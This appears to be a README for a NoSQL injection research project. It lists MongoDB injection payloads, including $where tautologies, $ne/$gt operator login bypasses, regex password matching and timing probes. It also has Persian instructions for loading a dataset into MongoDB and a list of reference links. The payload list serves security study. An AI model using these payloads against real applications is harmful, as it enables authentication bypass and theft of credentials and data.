# Injection
This is my injection research area

# Example:

Number one:
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
|| 1==1//
|| 1==1%00
}, { password : /.*/ }
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

# How to work
## Import dataset to MongoDB 
* file name Set_DataToMongo

این کد پایتون انجام کارهای زیر را انجام می‌دهد:

ابتدا به پایگاه داده مانگو دی‌بی متصل می‌شود.
سپس اطلاعات را از فایل dataset.json می‌خواند.
در نهایت اطلاعات را به صورت multirow در پایگاه داده مانگو دی‌بی ذخیره می‌کند.
برای اجرای این کد در PyCharm می‌توانید مراحل زیر را انجام دهید:

کد را در PyCharm باز کنید.
از طریق منوی Run گزینه Run 'main' را انتخاب کنید.
پس از اجرای کد، پیام "Data inserted into MongoDB successfully!" نمایش داده خواهد شد.
همچنین اطمینان حاصل کنید که پایگاه داده مانگو دی‌بی در حال اجرا باشد و فایل dataset.json در همان مسیر قرار داشته باشد.


# Reference
1. [Wiki NOSQL](https://en.wikipedia.org/wiki/NoSQL)
2. [NOSQL-DataBase](http://nosql-database.org/)
3. [GO NoSQLi](https://github.com/Charlie-belmer/nosqli)
4. [NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
5. [Testing for NoSQLi](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
6. [Injection MongoDB](https://zanon.io/posts/nosql-injection-in-mongodb/)
7. [nosql-injections-classique-blind](https://www.dailysecurity.fr/nosql-injections-classique-blind/)
8. [Python NOSQLi username and password](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/tree/master)
9. [Wordlist Mongo](https://github.com/cr0hn/nosqlinjection_wordlists/tree/master)
10. [NoSQLi Lab](https://github.com/digininja/nosqlilab)
11. [Fault-Injection-Dataset](https://github.com/dessertlab/Fault-Injection-Dataset)
12. [Synthetic-dataset-for-SQL-Injection](https://github.com/lsiddiqsunny/Synthetic-dataset-for-SQL-Injection)
13. [Injection attacks in apps with NoSQL Backends](https://github.com/riyazwalikar/injection-attacks-nosql-talk)
14. [400 dataset analysis no-sql dataset](https://github.com/capnmav77/No-SQL_Gen/blob/master/DatasetAnalytics.ipynb)

